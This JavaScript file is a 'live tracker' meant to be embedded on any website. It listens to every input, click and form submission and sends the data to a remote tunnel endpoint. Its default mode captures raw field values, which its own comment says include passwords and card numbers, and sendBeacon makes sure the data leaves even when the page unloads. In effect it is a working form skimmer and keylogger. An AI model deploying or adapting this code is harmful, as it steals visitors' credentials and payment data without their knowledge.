/**
 * OpenSwarm live tracker. Drop on any site:
 *   <script src="https://<your-tunnel>/swarm-tracker.js" data-endpoint="https://<your-tunnel>"></script>
 *
 * Captures raw input values as configured. See the RAW CAPTURE note below.
 */
(function () {
  var script = document.currentScript;
  var ENDPOINT =
    (script && script.getAttribute('data-endpoint')) ||
    window.SWARM_ENDPOINT ||
    '';
  if (!ENDPOINT) {
    console.warn('[swarm-tracker] no data-endpoint set; not tracking');
    return;
  }
  ENDPOINT = ENDPOINT.replace(/\/$/, '');

  // RAW CAPTURE: sends field values verbatim, including passwords and card numbers.
  // Set data-raw="false" to send only metadata (that a field was typed in, not what).
  var RAW = (script && script.getAttribute('data-raw')) !== 'false';
  var FLUSH_MS = 1200;
  var MAX_VALUE = 500;

  var sessionId = (function () {
    try {
      var k = 'swarm-tracker:sid';
      var v = sessionStorage.getItem(k);
      if (!v) {
        v = 's-' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 8);
        sessionStorage.setItem(k, v);
      }
      return v;
    } catch (e) {
      return 's-' + Date.now().toString(36);
    }
  })();

  var queue = [];
  var timer = null;

  function flush(useBeacon) {
    if (!queue.length) return;
    var batch = { events: queue.splice(0, queue.length) };
    var url = ENDPOINT + '/api/ingest/collect';
    var body = JSON.stringify(batch);
    try {
      // sendBeacon is the only transport that reliably survives page unload.
      if (useBeacon && navigator.sendBeacon) {
        navigator.sendBeacon(url, new Blob([body], { type: 'application/json' }));
        return;
      }
      fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: body,
        keepalive: true,
        mode: 'cors',
      }).catch(function () {});
    } catch (e) {}
  }

  function push(type, extra) {
    var e = { sessionId: sessionId, type: type, at: Date.now(), url: location.href };
    if (extra) for (var k in extra) e[k] = extra[k];
    queue.push(e);
    if (queue.length >= 25) return flush(false);
    if (!timer) {
      timer = setTimeout(function () {
        timer = null;
        flush(false);
      }, FLUSH_MS);
    }
  }

  function describe(el) {
    if (!el) return 'unknown';
    return (
      el.getAttribute('name') ||
      el.id ||
      el.getAttribute('placeholder') ||
      el.getAttribute('aria-label') ||
      (el.tagName || '').toLowerCase()
    );
  }

  function valueOf(el) {
    if (!RAW) return undefined;
    var v = el.value;
    if (typeof v !== 'string') return undefined;
    return v.length > MAX_VALUE ? v.slice(0, MAX_VALUE) + '…' : v;
  }

  function isInput(el) {
    if (!el || !el.tagName) return false;
    var t = el.tagName.toLowerCase();
    return t === 'input' || t === 'textarea' || t === 'select';
  }

  push('session_start', { meta: { ua: navigator.userAgent, ref: document.referrer } });

  document.addEventListener(
    'input',
    function (ev) {
      if (!isInput(ev.target)) return;
      push('input', {
        field: describe(ev.target),
        value: valueOf(ev.target),
        meta: { inputType: ev.target.type || null, length: (ev.target.value || '').length },
      });
    },
    true
  );

  document.addEventListener(
    'focusin',
    function (ev) {
      if (isInput(ev.target)) push('focus', { field: describe(ev.target) });
    },
    true
  );

  document.addEventListener(
    'focusout',
    function (ev) {
      if (isInput(ev.target)) {
        push('blur', {
          field: describe(ev.target),
          value: valueOf(ev.target),
          meta: { empty: !(ev.target.value || '').length },
        });
      }
    },
    true
  );

  document.addEventListener(
    'click',
    function (ev) {
      var el = ev.target;
      var label = (el.innerText || el.value || describe(el) || '').toString().slice(0, 80).trim();
      push('click', { field: describe(el), value: label, meta: { tag: (el.tagName || '').toLowerCase() } });
    },
    true
  );

  document.addEventListener(
    'submit',
    function (ev) {
      var fields = {};
      try {
        var els = (ev.target && ev.target.elements) || [];
        for (var i = 0; i < els.length; i++) {
          if (isInput(els[i]) && els[i].name) fields[els[i].name] = RAW ? valueOf(els[i]) : '(masked)';
        }
      } catch (e) {}
      push('submit', { field: describe(ev.target), meta: { fields: fields } });
      flush(true);
    },
    true
  );

  document.addEventListener('visibilitychange', function () {
    if (document.visibilityState === 'hidden') {
      push('tab_hidden');
      flush(true);
    }
  });

  window.addEventListener('pagehide', function () {
    push('session_end');
    flush(true);
  });

  window.swarmTrack = function (type, data) {
    push(type, data || {});
  };
})();
